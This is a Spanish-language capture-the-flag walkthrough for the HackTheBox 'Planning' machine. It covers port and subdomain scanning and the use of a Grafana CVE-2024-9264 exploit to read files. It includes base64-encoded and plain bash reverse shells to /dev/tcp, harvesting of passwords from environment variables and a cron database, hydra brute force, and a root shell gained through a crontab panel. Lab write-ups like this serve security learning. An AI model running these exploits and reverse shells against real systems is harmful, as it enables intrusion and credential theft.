---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Planning HackTheBox (Easy)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-12 11:01 EDT
Nmap scan report for 10.10.11.68
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.85 seconds
```

Veremos varias cosas interesantes entre ellas un puerto `80` en el que nos redirige al dominio llamado `planning.htb`, por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>           planning.htb
```

Lo guardamos y entraremos de nuevo en la web con dicho dominio.

```
URL = http://planning.htb/
```

Veremos una web dedicada a cursos educativos, pero nada mas interesante, por lo que vamos a realizar un poco de `fuzzing` a ver que vemos.

## FFUF

Despues de un rato de busqueda encunetro un `subdominio` utilizando este listado de aqui:

URL = [Subdomains.txt Web](https://gist.githubusercontent.com/six2dez/a307a04a222fab5a57466c51e1569acf/raw)

```shell
ffuf -c -w subdomains.txt -u http://planning.htb -H "Host: FUZZ.planning.htb" -fs 178
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb
 :: Wordlist         : FUZZ: /home/kali/Desktop/planning/subdomains.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 38ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Vamos añadirlo a nuestro archivo `hosts` de la siguiente forma:

```shell
nano /etc/hosts

#Dentro del nano
<IP>                planning.htb grafana.planning.htb
```

Lo guardamos y vamos a visitar dicho `subdominio` a ver que encontramos.

```
URL = http://grafana.planning.htb/
```

Veremos un `login` de `Grafana` es un `Software` de `Open source`, si buscamos la version de dicho `software` la veremos abajo.

## CVE-2024-9264 (Exploit)

```
Grafana v11.0.0
```

Vamos a buscar si tuviera algun exploit asociado al mismo.

Buscando un poco, veremos que hay una vulnerabilidad asociada a dicho `software` que afecta a la version especificamente `v11.0.0` justo la que esta instalada (`CVE-2024-9264`), por lo que vamos a probar a `explotarla` de esta forma.

URL = [Exploit Grafana v11.0.0](https://github.com/nollium/CVE-2024-9264)

En la documentacion del exploit veremos que requiere de unas credenciales validas, si probamos las que suelen venir por defecto `admin:admin` no va a funcionar, por lo que este comando no funcionara:

```shell
python3 exploit.py -u admin -p admin  -f /etc/passwd  http://grafana.planning.htb
```

Info:

```
[-] Failed to log in as admin:admin
```

Hay que encontrar unas credenciales validas para poder aprovechar dicha vulnerabilidad.

## Escalate user root (Docker)

Pero si leemos la descripcion de la maquina veremos que nos propocionan unas credenciales para dicho panel que vamos a probar directamente con el `exploit`.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-15 101821.png" alt=""><figcaption></figcaption></figure>

```shell
python3 exploit.py -u admin -p 0D5oT70Fq13EvB5r -f /etc/passwd  http://grafana.planning.htb
```

Info:

```
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Reading file: /etc/passwd
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/etc/passwd'):
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
grafana:x:472:0::/home/grafana:/usr/sbin/nologin
```

Vemos que esta funcionando de forma correcta, por lo que vamos a probar a ejecutar un comando realizando una `reverse shell` de esta forma:

```shell
echo 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' | base64 #Codificamos nuestra reverse shell

python3 exploit.py -u admin -p 0D5oT70Fq13EvB5r -c 'bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNS83Nzc3IDA+JjEK | base64 -d | bash"'  http://grafana.planning.htb #Ejecutamos el comando codificado, para que se decodifique cuando se cargue
```

Antes de enviarlo nos pondremos a la escucha de esta forma:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos el comando de antes y volvemos a donde tenemos la escucha veremos que ha funcionado.

```
listening on [any] 7777 ...
connect to [10.10.16.15] from (UNKNOWN) [10.10.11.68] 42566
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@7ce659d667d7:~# whoami
whoami
root
```

Con esto ya veremos que seremos `root` directamente, ya que el software lo esta ejecutando como `root`, vamos a sanitizar la shell un poco.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Pero si vemos el `hostname` veremos que estamos en un `docker`:

```
7ce659d667d7
```

Por lo que vamos a realizar un movimiento lateral, para obtener acceso al servidor real y no al propio `docker` ya que no estariamos realmente en el servidor, si no, en un espacio controlado aislado del host.

## Escalate user enzo

Si revisamos las variables de entorno.

```shell
env
```

Info:

```
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
```

Vamos a ver esas dos lineas interesantes, por lo que vamos a probar dichas credenciales por `SSH`.

### SSH

```shell
ssh enzo@<IP>
```

Metemos como contraseña `RioTecRANDEntANT!`...

```
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Sep 15 08:52:01 AM UTC 2025

  System load:  0.0               Processes:             245
  Usage of /:   67.8% of 6.30GB   Users logged in:       1
  Memory usage: 45%               IPv4 address for eth0: 10.10.11.68
  Swap usage:   0%

  => There are 2 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

102 updates can be applied immediately.
77 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Sep 15 08:52:01 2025 from 10.10.16.15
enzo@planning:~$ whoami
enzo
```

Con esto veremos que estaremos dentro, por lo que vamos a leer la `flag` del usuario.

> user.txt

```
31395d7e1be87b0a913bd2e61dcbf431
```

## Escalate Privileges

Si listamos los puertos que hay en el sistema, veremos lo siguiente:

```shell
ss -tuln
```

Info:

```
Netid          State           Recv-Q          Send-Q                    Local Address:Port                      Peer Address:Port          Process          
udp            UNCONN          0               0                            127.0.0.54:53                             0.0.0.0:*                              
udp            UNCONN          0               0                         127.0.0.53%lo:53                             0.0.0.0:*                              
tcp            LISTEN          0               4096                         127.0.0.54:53                             0.0.0.0:*                              
tcp            LISTEN          0               511                             0.0.0.0:80                             0.0.0.0:*                              
tcp            LISTEN          0               511                           127.0.0.1:8000                           0.0.0.0:*                              
tcp            LISTEN          0               4096                          127.0.0.1:3000                           0.0.0.0:*                              
tcp            LISTEN          0               70                            127.0.0.1:33060                          0.0.0.0:*                              
tcp            LISTEN          0               4096                          127.0.0.1:45219                          0.0.0.0:*                              
tcp            LISTEN          0               151                           127.0.0.1:3306                           0.0.0.0:*                              
tcp            LISTEN          0               4096                      127.0.0.53%lo:53                             0.0.0.0:*                              
tcp            LISTEN          0               4096                                  *:22                                   *:*
```

Veremos un puerto bastante interesante que es el `8000` por lo que vamos a realizar un `PortForwarding` hacia nuestro `host` de dicho puerto por `SSH` de esta forma:

```shell
ssh -L 8000:127.0.0.1:8000 enzo@<IP>
```

Metemos como contraseña `RioTecRANDEntANT!` y con esto ya habremos echo la redireccion, por lo que si nos conectamos por internet a dicho puerto que ahora escucha en nuestro `localhost`.

```
URL = http://127.0.0.1:8000/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-15 112255.png" alt=""><figcaption></figcaption></figure>

Veremos que nos salta un panel de autenticacion, pero en este caso de `GET` que se identifica por el `Authorization: Basic <Base64>`, no es un formulario `POST`, por lo que podriamos probar a realizar un poco de `fuerza bruta` con `hydra` a ver que vemos.

```shell
hydra -l admin -P <WORDLIST> 127.0.0.1 -s 8000 http-get / -t 64 -I
```

Pero no veremos nada, si recordamos antes e investigamos un poco, llendonos a la carpeta `/opt` veremos una carpeta llamada `crontabs` que dentro habra un archivo llamado `crontab.db`:

```
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```

Veremos muchas cosas interesantes, entre ellas una contraseña `P4ssw0rdS0pRi0T3c` que sirve para decodificar la contraseña del `zip` que se esta ejecutando, pero si probamos a meter esa contraseña en el panel con el usuario `root`.

```
User: root
Pass: P4ssw0rdS0pRi0T3c
```

Veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-15 114140.png" alt=""><figcaption></figcaption></figure>

Veremos que hemos accedido al panel de forma correcta, tambien vemos que es un panel en el que puede programar `crontabs` a nivel de sistema por lo que estamos viendo, vamos a probar a crear un `crontab` de la siguiente forma:

Antes vamos a crear un archivo con una `shell` para que lo ejecute el `crontab`.

> shell.sh

```bash
#!/bin/bash

sh -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Ahora lo configuramos para que ejecute dicho archivo que hemos dejado en `/tmp`.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-15 114832.png" alt=""><figcaption></figcaption></figure>

Una vez escrito todo, le daremos a `Save` para guardarlo, despues nos pondremos a la escucha de esta forma:

```shell
nc -lvnp <PORT>
```

Ahora si le damos al boton `Run Now` para que se ejecute ya y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7755 ...
connect to [10.10.16.15] from (UNKNOWN) [10.10.11.68] 40048
bash: cannot set terminal process group (1195): Inappropriate ioctl for device
bash: no job control in this shell
root@planning:/# whoami
whoami
root
```

Veremos que ha funcionado, por lo que leeremos la `flag` de `root`.

> root.txt

```
b9c882f56b82ef2584a10c4ac391655b
```
